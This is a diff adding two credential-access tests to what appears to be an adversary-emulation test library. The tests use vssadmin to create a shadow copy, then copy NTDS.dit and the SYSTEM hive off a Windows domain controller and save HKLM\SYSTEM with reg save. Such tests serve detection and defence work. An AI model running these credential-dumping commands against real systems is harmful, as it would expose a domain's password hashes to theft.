@@ -14318,6 +14318,46 @@ credential-access:
         command: 'ntdsutil “ac i ntds” “ifm” “create full #{output_folder} q q
 
 '
+    - name: Create Volume Shadow Copy with NTDS.dit
+      description: 'The Active Directory database NTDS.dit may be dumped by copying
+        it from a Volume Shadow Copy.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        drive_letter:
+          description: Drive letter to source VSC (including colon)
+          type: String
+          default: 'C:'
+      executor:
+        name: command_prompt
+        command: 'vssadmin.exe create shadow /for=#{drive_letter}
+
+'
+    - name: Copy NTDS.dit from Volume Shadow Copy
+      description: "The Active Directory database NTDS.dit may be dumped by copying
+        it from a Volume Shadow Copy.\n\nThis test requires steps taken in the test
+        \"Create Volume Shadow Copy with NTDS.dit\".\nA successful test also requires
+        the export of the SYSTEM Registry hive. \nThis test must be executed on a
+        Windows Domain Controller.\n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        vsc_name:
+          description: Name of Volume Shadow Copy
+          type: String
+          default: "\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1"
+        extract_path:
+          description: Path for extracted NTDS.dit
+          type: Path
+          default: C:\Extract
+      executor:
+        name: command_prompt
+        command: |-
+          copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
+          copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
+          reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
   T1081:
     technique:
       external_references:
